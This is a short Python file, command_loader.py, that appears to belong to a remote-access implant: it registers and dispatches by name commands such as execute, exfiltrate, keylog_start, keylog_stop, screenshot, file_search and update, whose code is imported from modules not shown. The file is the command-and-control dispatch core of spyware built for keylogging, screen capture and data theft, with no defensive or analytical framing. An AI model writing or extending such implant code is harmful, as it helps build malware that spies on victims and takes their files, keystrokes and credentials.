# command_loader.py

# Import command modules
from .agent_commands.core_commands import checkin, execute, exfiltrate, heartbeat, shutdown, status, update
from .agent_commands.optional_commands import file_search, keylog_start, keylog_stop, list_processes, screenshot, sysinfo

# Command registry mapping command names to functions
COMMAND_REGISTRY = {
    "checkin": checkin.checkin,
    "execute": execute.execute,
    "exfiltrate": exfiltrate.exfiltrate,
    "heartbeat": heartbeat.heartbeat,
    "shutdown": shutdown.shutdown,
    "status": status.status,
    "update": update.update,
    # Optional commands
    "file_search": file_search.file_search,
    "keylog_start": keylog_start.keylog_start,
    "keylog_stop": keylog_stop.keylog_stop,
    "list_processes": list_processes.list_processes,
    "screenshot": screenshot.screenshot,
    "sysinfo": sysinfo.sysinfo,
}

def load_and_execute_command(command_name, *args, **kwargs):
    """
    Loads and executes a command based on the command name.
    
    :param command_name: The name of the command to execute.
    :param args: Positional arguments for the command function.
    :param kwargs: Keyword arguments for the command function.
    :return: The result of the command execution.
    """
    command_func = COMMAND_REGISTRY.get(command_name)
    
    if command_func:
        return command_func(*args, **kwargs)
    else:
        raise ValueError(f"Command '{command_name}' not found in registry.")
